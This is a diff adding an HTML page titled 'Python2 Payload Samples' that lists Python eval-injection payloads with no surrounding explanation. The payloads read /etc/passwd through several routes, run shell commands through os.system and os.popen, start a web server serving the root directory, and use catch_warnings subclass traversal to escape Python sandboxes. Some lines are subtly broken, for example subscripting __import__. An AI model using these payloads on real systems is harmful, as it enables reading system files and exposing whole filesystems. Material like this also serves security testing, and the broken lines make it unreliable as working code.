@@ -1,0 +1,40 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Python2 Payload Samples</title>
+</head><body>print('THIS IS A PYTHON EVAL INTERPRETED OUTPUT')<br/>
+exit()<br/>
+sum(xrange(-999999999,99999999))<br/>
+&nbsp;<br/>
+file('/etc/passwd').read()<br/>
+open('/etc/passwd').read()<br/>
+__import__['fileinput'].input('/etc/passwd')<br/>
+__import__['os'].system('cat /etc/passwd')<br/>
+__import__['os'].popen('/etc/passwd', 'r').read()<br/>
+__import__['os'].system('cd /; python -m SimpleHTTPServer')<br/>
+&nbsp;<br/>
+print(file('/etc/passwd').read())<br/>
+print(open('/etc/passwd').read())<br/>
+print(__import__['fileinput'].input('/etc/passwd'))<br/>
+print(__import__['os'].system('cat /etc/passwd'))<br/>
+print(__import__['os'].popen('/etc/passwd', 'r').read())<br/>
+print(__import__['os'].system('cd /; python -m SimpleHTTPServer'))<br/>
+&nbsp;<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']('THIS IS A PYTHON EVAL INTERPRETED OUTPUT')<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['exit']()<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['sum']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['xrange'](-999999999,99999999))<br/>
+&nbsp;<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['file']('/etc/passwd').read()<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('/etc/passwd').read()<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('fileinput').input('/etc/passwd')<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cat /etc/passwd')<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('/etc/passwd', 'r').read()<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cd /; python -m SimpleHTTPServer')<br/>
+&nbsp;<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['file']('/etc/passwd').read())<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('/etc/passwd').read())<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('fileinput').input('/etc/passwd'))<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cat /etc/passwd'))<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('/etc/passwd', 'r').read())<br/>
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cd /; python -m SimpleHTTPServer'))</body></html>
